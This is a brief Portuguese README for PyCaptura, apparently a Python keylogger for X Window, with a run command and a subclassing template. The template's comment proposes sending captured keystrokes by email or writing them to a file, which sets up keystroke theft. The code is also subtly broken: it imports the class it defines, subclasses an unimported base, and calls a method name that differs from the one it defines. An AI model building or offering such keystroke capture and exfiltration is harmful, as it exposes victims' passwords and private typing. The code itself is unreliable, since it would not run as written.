# PyCaptura: Um keylogger para o X Window System

## Como usar
O PyCaptura já vem com um simples keylogger, que imprime na tela tudo o que é digitado. Para rodá-lo digite:
    `python pycaptura.py`

***

Caso deseje fazer algo além imprimir a captura do teclado na tela basta criar sua própria classe de keylogger, sobrescrever o KeyboardCapture:
```python
from pycaptura import MyKeylogger


class MyKeylogger(KeyboardCapture):
    def do_something_with_logged_keys(self, has_pressed, pressed_keys, key_modifiers):
        # send keys via email, log to file etc.
        ...

    def run(self):
        state = self.display.get_keyboard_state()
        has_pressed, pressed_key, key_modifiers = self.parse_keyboard_state(state)
        self.do_something_with_pressed_keys(has_pressed, pressed_keys, key_modifiers)
```
